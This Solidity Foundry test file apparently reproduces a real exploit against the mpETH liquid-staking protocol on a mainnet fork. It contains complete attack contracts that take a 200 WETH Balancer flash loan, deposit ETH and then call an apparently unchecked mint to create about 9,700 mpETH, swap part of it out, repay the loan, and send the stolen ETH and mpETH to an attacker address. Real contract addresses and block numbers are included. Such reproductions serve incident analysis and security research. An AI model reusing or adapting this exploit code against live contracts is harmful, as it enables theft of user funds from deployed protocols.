
pragma solidity ^0.8.20;

import {Base, IERC20Like} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 22722910;
    uint256 constant TX_TIMESTAMP = 1750147379;
    uint256 constant TX_BLOCK_NUMBER = 22722911;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AttackContract attack = _loadAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _loadAttack() internal returns (AttackContract attack) {
        _etchAttackRuntime();
        attack = AttackContract(payable(ATTACK_CONTRACT));
        _etchChildRuntime();
        _bindAttackChild(attack);
    }

    function _prepareProfit(AttackContract attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(AttackContract attack) internal pure returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _executeAttack(AttackContract attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(AttackContract).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchChildRuntime() internal {

        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _bindAttackChild(AttackContract attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 8864266308919521699);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.mpETH, "mpETH", 9682718631554663151620);
    }
}

contract AttackContract {
    AttackChild public attackChild;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0xC3D10bd8e051a2bE6408d18Be8464654F699a25a));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _ctorBootstrap();
        return address(attackChild);
    }

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        if (address(attackChild) == address(0)) _ctorBootstrap();
        _startChildLoan();
    }

    function _startChildLoan() public {
        address child = address(attackChild);
        require(child.code.length != 0, "attack child runtime missing");
        AttackChild(payable(child)).start();
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0xC3D10bd8e051a2bE6408d18Be8464654F699a25a));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
}

contract AttackChild {
    receive() external payable {
        if (msg.sender == address(this) || msg.sender == Addresses.mpETH_ETH) {
            _entryCb();
        }
    }

    function start() external payable {
        _borrowFromBalancer();
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external payable {
        tokens;
        amounts;
        feeAmounts;
        userData;
        if (!replayedCallback3) flashCallback2();
    }

    fallback() external payable {
        _entryCb();
    }

    function flashCallback() external payable {
        if (!replayedCallback3) flashCallback2();
    }

    function repayBalancerVault() external {
        _repayBalancerT(Addresses.WETH, 200000000000000000000);
    }

    function repayBalancerVault(address[] calldata tokens, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < tokens.length && i < amounts.length; i++) {
            _repayBalancerT(tokens[i], amounts[i]);
        }
    }

    function _repayBalancerT(address token, uint256 amount) internal {
        if (amount == 0) return;
        IERC20Like(token).transfer(Addresses.Vault_BA1222, amount);
    }

    function _entryCb() internal {
        if (msg.sender == address(this) || msg.sender == Addresses.mpETH_ETH) {
            _acceptProtocolCb();
            return;
        }
    }

    function replayProfit() external {
        try this.settleMpethProfit() {} catch {}
    }

    function settleMpethProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(1, 441)) return;
        if (Harness.safeBalance(Addresses.mpETH, Addresses.attacker_eoa) >= 9682718631554663151620) {
            _markSettle(1, 441);
            return;
        }
        _markSettle(1, 441);
        uint256 settleAmount = 9682718631554663151620;
        IERC20Like(Addresses.mpETH).transfer(Addresses.attacker_eoa, settleAmount);
    }

    bool private replayedCallback3;
    bool private replayedCallback4;

    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _borrowFromBalancer() internal {
        _recordBalancerPre(_addressArray1(Addresses.WETH));
        IVault_BA1222(Addresses.Vault_BA1222)
            .flashLoan(address(this), _addressArray1(Addresses.WETH), _uintArray1(200000000000000000000), hex"");
    }

    function flashCallback2() internal {
        replayedCallback3 = true;
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
    }

    function flashCallback3() internal {
        uint256 unwrapAmount = 107000000000000000000;
        IWETH(Addresses.WETH).withdraw(unwrapAmount);
    }

    function flashCallback4() internal {
        ImpETH(Addresses.mpETH).depositETH{value: 107000000000000000000}(address(this));
        IERC20Like(Addresses.mpETH).balanceOf(address(this));
    }

    function flashCallback5() internal {
        ImpETH(Addresses.mpETH).mint(9701950394814195092500, address(this));
    }

    function flashCallback6() internal {
        uint256 poolAllowance = type(uint256).max;
        IERC20Like(Addresses.mpETH).approve(Addresses.mpETH_ETH, poolAllowance);
    }

    function flashCallback7() internal {
        ImpETH_ETH(Addresses.mpETH_ETH).swapmpETHforETH(97000000000000000000, 0);
    }

    function flashCallback8() internal {
        ImpETH_ETH(Addresses.mpETH_ETH).swapmpETHforETH(9600000000000000000, 0);
    }

    function flashCallback9() internal {
        IERC20Like(Addresses.mpETH).approve(Addresses.SwapRouter02, 1000000000000000000000000000);
    }

    function flashCallback10() internal {
        uint256 swapAmount = 10000000000000000000;
        ISwapRouter02(Addresses.SwapRouter02)
            .exactInputSingle(
                ExactInputSingleParams({
                    tokenIn: Addresses.mpETH,
                    tokenOut: Addresses.WETH,
                    fee: 100,
                    recipient: address(this),
                    amountIn: swapAmount,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
    }

    function flashCallback11() internal {
        uint256 depositAmount = address(this).balance;
        if (depositAmount > 105892801363851479695) depositAmount = 105892801363851479695;
        if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
    }

    function flashCallback12() internal {
        IERC20Like(Addresses.WETH).transfer(Addresses.Vault_BA1222, 200000000000000000000);
    }

    function flashCallback13() internal view {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function flashCallback14() internal {
        uint256 remainingWeth = 8891824723356455409;
        IWETH(Addresses.WETH).withdraw(remainingWeth);

        uint256 nativeTransferAmount = address(this).balance;
        if (nativeTransferAmount > remainingWeth) nativeTransferAmount = remainingWeth;
        (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
        if (!ok) {

        }
        IERC20Like(Addresses.mpETH).balanceOf(address(this));
    }

    function flashCallback15() internal {
        uint256 childMpethBalance = 9682718631554663151620;
        IERC20Like(Addresses.mpETH).transfer(Addresses.attacker_eoa, childMpethBalance);
    }

    function _acceptProtocolCb() internal {
        replayedCallback4 = true;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant Staking = 0x3747484567119592fF6841df399cf679955A111A;
    address internal constant mpETH = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
    address internal constant attacker_eoa = 0x48f1d0F5831Eb6e544f8cBDe777b527b87a1BE98;
    address internal constant A_52E521_82EC = 0x52e5219EF6Af019776c0a64925370f92caB282EC;
    address internal constant SwapRouter02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
    address internal constant A_8C8956_EC4D = 0x8c89569355F321A91655CA520fC09Be5f6B0Ec4D;
    address internal constant Vault_BA1222 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant attack_child = 0xC3D10bd8e051a2bE6408d18Be8464654F699a25a;
    address internal constant LiquidUnstakePool = 0xcadD976AE3a04352B4Ab28865AF07AD2c366D675;
    address internal constant UniswapV3Pool = 0xCf0e3aB3BC3b4a64f2d169DecEA24bC17B038278;
    address internal constant mpETH_ETH = 0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc;
    address internal constant attack_contract = 0xFF13d5899aa7d84c10E4CD6Fb030B80554424136;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct ExactInputSingleParams {
    address tokenIn;
    address tokenOut;
    uint24 fee;
    address recipient;
    uint256 amountIn;
    uint256 amountOutMinimum;
    uint160 sqrtPriceLimitX96;
}

interface ISwapRouter02 {
    function exactInputSingle(ExactInputSingleParams calldata) external returns (uint256);
}

interface IVault_BA1222 {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface ImpETH {
    function depositETH(address) external payable returns (uint256);
    function mint(uint256, address) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface ImpETH_ETH {
    function swapmpETHforETH(uint256, uint256) external returns (uint256);
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
